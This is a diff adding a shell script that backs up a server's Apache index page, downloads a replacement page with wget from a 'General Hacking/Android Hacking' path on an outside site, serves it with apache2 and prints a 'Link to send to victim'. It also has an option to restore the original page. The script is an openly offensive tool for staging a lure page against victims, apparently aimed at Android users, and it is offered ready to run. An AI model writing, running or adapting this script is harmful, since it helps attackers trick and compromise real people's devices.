@@ -1,0 +1,54 @@
+#!/bin/sh
+
+yellow='\033[1;33m'
+green='\033[1;32m'
+red='\033[1;31m'
+nc='\033[0m'
+
+link=$(hostname -I | awk '{print $1}')
+result=$(ls /var/www/html/index.html)
+right="/var/www/html/index.html"
+
+printf "Do you want to make server or restore [ make | restore ]\nYour answer :- "
+read ans
+
+if [ "$ans" = "make" ]; then
+
+printf "${yellow}[*] Searching for existing apache2 server files.."
+
+if [ "$result" = "$right" ]; then
+clear
+printf "${green}[+] File found\n"
+echo "${yellow}[*] Creating backup\n"
+mkdir /root/.backup_dir/
+mv /var/www/html/index.html /root/.backup_dir
+printf "${green}[+] Done\n"
+printf "${yellow}[*] Making custom page ... \n${nc}"
+wget https://vulnx.in/Contents/General%20Hacking/Android%20Hacking/index.html_source.txt
+mv index.html_source.txt index.html
+mv index.html /var/www/html/
+printf "${green}[+] Done\n"
+printf "${yellow}[!] Starting esstential services ...\n"
+service apache2 start
+printf "${green}[+] Server successfully start\n"
+printf "${green}[+] Link to send to victim : $link"
+else
+clear
+echo "${red}[X] Not found!"
+printf "${yellow}[*] Making custom page ... \n${nc}"
+wget https://vulnx.in/Contents/General%20Hacking/Android%20Hacking/index.html_source.txt
+mv index.html_source.txt index.html
+mv index.html /var/www/html/
+printf "${green}[+] Done\n"
+printf "${yellow}[!] Starting esstential services ...\n"
+service apache2 start
+printf "${green}[+] Server successfully start\n"
+printf "${green}[+] Link to send to victim : $link"
+fi
+
+elif [ "$ans" = "restore" ]; then
+clear
+printf "${yellow}[!] Restoring previous version of index.html...\n"
+mv /root/.backup_dir/index.html /var/www/html/index.html
+printf "Done\n"
+fi
